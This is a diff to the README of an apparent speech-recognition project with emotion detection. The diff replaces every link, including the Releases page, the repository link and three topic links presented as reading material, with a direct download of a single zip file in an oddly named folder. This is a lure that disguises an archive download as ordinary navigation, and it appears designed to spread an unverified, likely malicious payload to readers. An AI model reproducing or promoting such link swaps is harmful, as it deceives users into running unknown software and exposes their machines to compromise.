@@ -1,6 +1,6 @@
 # 🎤 emotion-aware-automatic-speech-recognition - Understand Speech with Emotion Insight 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ To run this application smoothly, ensure your computer meets the following requi
 
 Click the button below to go to the Releases page. This is where you’ll find the necessary files to download.
 
-[Download Latest Release](https://github.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/releases)
+[Download Latest Release](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
 
 ### Step 2: Download the Application
 
@@ -86,13 +86,13 @@ For any questions or suggestions, feel free to reach out through the repository 
 
 For a deeper understanding of the methods used in this application—like emotion detection, speech recognition, and more—check out the following topics:
 
-- [Audio Processing](https://www.example.com/audio-processing)
-- [Emotion AI](https://www.example.com/emotion-ai)
-- [Natural Language Processing](https://www.example.com/nlp)
+- [Audio Processing](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
+- [Emotion AI](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
+- [Natural Language Processing](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
 
 ## 🔗 Links
 
-- [Project Repository](https://github.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition)
-- [Download Latest Release](https://github.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/releases)
+- [Project Repository](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/NotAbhinavGamerz/emotion-aware-automatic-speech-recognition/main/liberalistic/emotion-aware-automatic-speech-recognition.zip)
 
 Thank you for trying out the emotion-aware-automatic-speech-recognition application! Enjoy your experience with speech recognition enhanced with emotion detection.
